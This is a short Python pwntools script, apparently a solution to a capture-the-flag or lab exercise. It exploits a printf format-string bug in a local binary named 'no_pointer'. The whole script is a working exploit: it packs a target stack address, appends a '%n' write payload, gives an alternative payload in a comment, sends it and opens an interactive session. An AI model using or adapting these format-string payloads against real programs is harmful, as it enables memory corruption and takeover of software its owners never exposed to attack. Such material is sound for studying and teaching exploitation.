from pwn import *

elf = ELF("./no_pointer")
p = elf.process()

# Address to write to. p32() does the converting for us
addr = p32(0xffffcb0c)
print(addr)

# Payload to insert into printf
payload = addr + b"%500x%7$n"

# Alternative Method of writing this
# payload = b"\x0c\xcb\xff\xff.%08x.%08x.%08x.%08x.%08x.%08x.%n"

p.sendline(payload)
p.interactive()